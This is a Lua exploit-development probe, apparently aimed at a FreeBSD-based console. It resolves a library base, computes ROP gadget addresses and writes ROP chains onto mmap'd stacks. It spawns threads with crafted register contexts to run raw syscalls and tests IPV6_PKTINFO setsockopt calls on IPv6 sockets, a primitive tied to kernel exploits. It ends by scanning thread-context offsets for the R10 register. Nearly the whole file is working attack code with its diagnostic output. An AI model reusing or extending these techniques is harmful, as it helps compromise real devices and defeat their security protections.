-- CRASH_CLASS: MODERATE
-- PROBE 91i: Child setsockopt as FIRST syscall, then write result
--
-- 91h: getpid works from child, setsockopt returns -1 after getpid.
-- Hypothesis A: R10/R8 clobbered by prior syscall
-- Hypothesis B: setsockopt blocked from child threads
-- Test: setsockopt as first syscall (fresh context), capture rv.
-- Also: child creates its OWN socket and tries setsockopt on it.

print("=== PROBE 91i: CHILD SETSOCKOPT FIRST ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R8=0x068;local _R10=0x090;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local PV6=41; local PKTINFO=46

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local function get_marker(s6)
    local gb=memory.alloc(32); z(gb,32)
    local gl=memory.alloc(4); wd(gl,20)
    local rv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
    if rv~=0 then return nil end
    return rd(gb)
end

-- ============================================================
-- TEST A: setsockopt as FIRST syscall, write result
-- ============================================================
print("--- A: SETSOCKOPT FIRST ---")

local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("BLOCKED") return end

local pi_c=memory.alloc(20); z(pi_c,20); wd(pi_c,2)
print("pi_c="..q(pi_c))

-- Set baseline=77
local p0=memory.alloc(20); z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)
print("baseline marker="..tostring(get_marker(s6)))

-- Verify setsockopt works from main thread with same args
local rv_main=N(native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(pi_c),20))
print("main setsockopt rv="..rv_main.." marker="..tostring(get_marker(s6)))

-- Reset baseline
z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)

-- Shared buffer for child results
local shared=memory.alloc(64); z(shared,64)
wq(shared,uint64(0xBADBAD))
wq(shared+8,uint64(0xBADBAD))

local STSZ=0x4000
local ok_s,stk=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s then print("FAIL mmap") return end

-- Chain after first setsockopt:
-- Write RAX (setsockopt rv) to shared+0
-- Then getpid, write to shared+8
-- Then nanosleep
local off=0
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared))); off=off+8
wq(stk+off,WMOV); off=off+8  -- shared+0 = setsockopt rv

-- getpid + write to shared+8
wq(stk+off,PRAX); off=off+8
wq(stk+off,uint64(20)); off=off+8
wq(stk+off,SA); off=off+8  -- getpid
wq(stk+off,PRDI); off=off+8
wq(stk+off,uint64(N(shared)+8)); off=off+8
wq(stk+off,WMOV); off=off+8  -- shared+8 = pid

-- nanosleep
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(N(ts))); off=off+8
wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
wq(stk+off,SA); off=off+8

-- Context: entry at SA, first syscall = setsockopt
local ctx=memory.alloc(0x200); z(ctx,0x200)
wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
wq(ctx+_TP,uint64(0x10000))
wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
wq(ctx+_IP,SA)
wq(ctx+_SP,uint64(N(stk)))
wq(ctx+_AX,uint64(105))      -- setsockopt
wq(ctx+_DI,uint64(s6))       -- fd
wq(ctx+_SI,uint64(PV6))      -- IPPROTO_IPV6
wq(ctx+_DX,uint64(PKTINFO))  -- IPV6_PKTINFO
wq(ctx+_R10,uint64(N(pi_c))) -- optval
wq(ctx+_R8,uint64(20))       -- optlen

local tb=memory.alloc(8); wq(tb,uint64(0))
local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
local tid=rq(tb)
print("thr_create rv="..(ok_t and tostring(N(rv_t)) or "X").." tid="..q(tid))

-- Wait 50ms
local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
native.fcall_with_rax(stub,240,N(sl),0)
print("child alive="..tostring(alive(tid)))

local v0=rq(shared)
local v1=rq(shared+8)
print("setsockopt rv="..q(v0))
print("getpid="..q(v1).." (expect "..pid..")")
print("marker="..tostring(get_marker(s6)))

if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end

-- ============================================================
-- TEST B: Child creates OWN socket + setsockopt
-- ============================================================
print("")
print("--- B: CHILD OWN SOCKET ---")

-- Child chain:
-- 1. socket(AF_INET6=28, DGRAM=2, 0) → fd in RAX
-- 2. Write fd to shared+0
-- 3. setsockopt(fd, 41, 46, pi_c2, 20) — but need R10=pi_c2!
-- Problem: after socket(), R10 might be clobbered.
-- Skip this — can't set R10 without pop r10 gadget.
-- Instead: just test if socket() works from child.

local shared2=memory.alloc(32); z(shared2,32)
wq(shared2,uint64(0xBADBAD))

local ok_s2,stk2=pcall(function()
    return mm(uint64(0),uint64(STSZ),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_s2 then print("FAIL mmap2") return end

-- Entry: socket(28, 2, 0) via SA
-- After: write fd to shared2
local off2=0
wq(stk2+off2,PRDI); off2=off2+8
wq(stk2+off2,uint64(N(shared2))); off2=off2+8
wq(stk2+off2,WMOV); off2=off2+8  -- shared2+0 = socket fd

-- nanosleep
wq(stk2+off2,PRDI); off2=off2+8; wq(stk2+off2,uint64(N(ts))); off2=off2+8
wq(stk2+off2,PRSI); off2=off2+8; wq(stk2+off2,uint64(0)); off2=off2+8
wq(stk2+off2,PRAX); off2=off2+8; wq(stk2+off2,uint64(240)); off2=off2+8
wq(stk2+off2,SA); off2=off2+8

local ctx2=memory.alloc(0x200); z(ctx2,0x200)
wq(ctx2+_MG,uint64(0x480)); wd(ctx2+_FL,0)
wq(ctx2+_TP,uint64(0x10000))
wq(ctx2+_CS,uint64(0x43)); wq(ctx2+_SS,uint64(0x3B))
wq(ctx2+_IP,SA)
wq(ctx2+_SP,uint64(N(stk2)))
wq(ctx2+_AX,uint64(97))    -- socket
wq(ctx2+_DI,uint64(28))    -- AF_INET6
wq(ctx2+_SI,uint64(2))     -- SOCK_DGRAM
wq(ctx2+_DX,uint64(0))     -- protocol

local tb2=memory.alloc(8); wq(tb2,uint64(0))
local ok_t2,rv_t2=pcall(function() return tc(uint64(ctx2),uint64(tb2),uint64(0)) end)
local tid2=rq(tb2)
print("thr_create rv="..(ok_t2 and tostring(N(rv_t2)) or "X").." tid="..q(tid2))

native.fcall_with_rax(stub,240,N(sl),0)
print("child alive="..tostring(alive(tid2)))

local sock_fd=rq(shared2)
print("socket fd="..q(sock_fd))

if tid2 and N(tid2)>0 then pcall(function() tk(tid2,uint64(9)) end) end

-- ============================================================
-- TEST C: Try setsockopt with R10 at DIFFERENT context offsets
-- ============================================================
print("")
print("--- C: R10 OFFSET SCAN ---")

-- Maybe R10 is not at 0x090. Try other offsets.
-- We'll spawn children with optval addr at different offsets,
-- and see which one makes setsockopt return 0.

local shared3=memory.alloc(256); z(shared3,256)

-- Reset baseline
z(p0,20); wd(p0,77)
native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)

local test_offsets={0x060,0x070,0x080,0x088,0x090,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
local pi_test=memory.alloc(20); z(pi_test,20); wd(pi_test,42)

for idx,r10_off in ipairs(test_offsets) do
    local ok_sm,stkm=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_sm then print("mmap fail at "..idx) break end

    local offm=0
    -- After setsockopt: write result to shared3+idx*8
    wq(stkm+offm,PRDI); offm=offm+8
    wq(stkm+offm,uint64(N(shared3)+idx*8)); offm=offm+8
    wq(stkm+offm,WMOV); offm=offm+8
    -- nanosleep
    wq(stkm+offm,PRDI); offm=offm+8; wq(stkm+offm,uint64(N(ts))); offm=offm+8
    wq(stkm+offm,PRSI); offm=offm+8; wq(stkm+offm,uint64(0)); offm=offm+8
    wq(stkm+offm,PRAX); offm=offm+8; wq(stkm+offm,uint64(240)); offm=offm+8
    wq(stkm+offm,SA); offm=offm+8

    local ctxm=memory.alloc(0x200); z(ctxm,0x200)
    wq(ctxm+_MG,uint64(0x480)); wd(ctxm+_FL,0)
    wq(ctxm+_TP,uint64(0x10000))
    wq(ctxm+_CS,uint64(0x43)); wq(ctxm+_SS,uint64(0x3B))
    wq(ctxm+_IP,SA)
    wq(ctxm+_SP,uint64(N(stkm)))
    wq(ctxm+_AX,uint64(105))
    wq(ctxm+_DI,uint64(s6))
    wq(ctxm+_SI,uint64(PV6))
    wq(ctxm+_DX,uint64(PKTINFO))
    wq(ctxm+_R8,uint64(20))
    -- Write pi_test addr to the test offset
    wq(ctxm+r10_off,uint64(N(pi_test)))

    local tbm=memory.alloc(8); wq(tbm,uint64(0))
    pcall(function() tc(uint64(ctxm),uint64(tbm),uint64(0)) end)
    local tidm=rq(tbm)

    native.fcall_with_rax(stub,240,N(sl),0)

    local rv=rq(shared3+idx*8)
    local rvn=N(rv)
    -- Convert signed: if high bit set, it's negative
    local rvs=rvn
    if type(rv)=="table" and rv.h and rv.h<0 then rvs=-1 end

    print("  off="..string.format("0x%03X",r10_off)
        .." rv="..q(rv)
        ..(rvs==0 and " *** SUCCESS ***" or ""))

    if tidm and N(tidm)>0 then pcall(function() tk(tidm,uint64(9)) end) end

    -- Reset baseline if succeeded
    if rvs==0 then
        local mkv=get_marker(s6)
        print("  marker="..tostring(mkv).." (42=child set it)")
        z(p0,20); wd(p0,77)
        native.fcall_with_rax(stub,105,s6,PV6,PKTINFO,N(p0),20)
    end
end

-- ============================================================
-- Cleanup
-- ============================================================
print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91i DONE ===")
